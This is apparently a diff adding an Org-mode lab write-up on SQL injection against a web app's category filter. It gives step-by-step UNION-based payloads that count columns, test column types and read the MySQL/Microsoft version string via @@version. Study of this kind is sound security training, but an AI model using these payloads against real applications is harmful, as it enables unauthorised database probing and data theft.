@@ -1,0 +1,45 @@
+#+title: SQL injection attack, querying the database type and version on MySQL and Microsoft
+
+* About
+sql injection on ~catergory~ filter
+
+** End Goal
+Display database version string
+
+* Steps
+** Step 1
+Find out how many columns are there
+#+begin_src sql
+'ORDER BY 1 --
+#+end_src
+#+begin_quote
+This will give error because in this database system '--' this comment syntax is invalid
+We can use another syntax for the comment '#'
+#+end_quote
+
+So query will be
+#+begin_src sql
+'ORDER BY 1 #
+#+end_src
+
+Similarly check out until we get error
+#+begin_quote
+Column will be 2
+#+end_quote
+
+** Step 2
+Check the data type of those 2 columns
+#+begin_src sql
+'UNION SELECT 'abc', NULL #
+#+end_src
+And so on
+#+begin_quote
+Both columns will be string data type
+#+end_quote
+
+* Solution
+To find out version for database of Microsoft and Mysql we use ~SELECT @@version~
+
+#+begin_src sql
+'UNION SELECT @@version, NULL #
+#+end_src
